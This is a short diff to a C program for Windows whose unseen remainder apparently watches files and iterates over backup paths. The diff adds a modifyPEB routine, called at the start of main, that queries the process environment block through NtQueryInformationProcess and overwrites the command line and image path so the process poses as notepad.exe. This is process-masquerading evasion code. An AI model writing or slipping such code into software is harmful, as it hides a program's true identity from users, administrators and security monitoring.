@@ -1,4 +1,31 @@
 #include <windows.h>
+#include <winternl.h>
+#include <stdio.h> // for testing
+
+#define PATH MAX_PATH
+
+typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+void modifyPEB()
+{
+        HANDLE h = GetCurrentProcess();
+        PROCESS_BASIC_INFORMATION ProcessInformation;
+        ULONG length = 0;
+        MYPROC ptrNtQueryInformationProcess;
+        const wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
+        const wchar_t* path = L"C:\\Windows\\System32";
+        HINSTANCE ntdll = LoadLibraryA("Ntdll.dll");
+
+        ptrNtQueryInformationProcess = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");
+        (ptrNtQueryInformationProcess)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &length);
+
+        // modify PEB data
+        SetCurrentDirectoryW(path);
+        ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = (wchar_t*)commandline;
+        ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = (wchar_t*)commandline;
+
+        getchar(); // for testing
+}
 
 const char* backupArray[] = {
     "backuppath",
@@ -46,6 +73,8 @@ int iterateBackups()
 
 int main()
 {
+    modifyPEB();
+
     for(;;)
     {
         // files watchdog
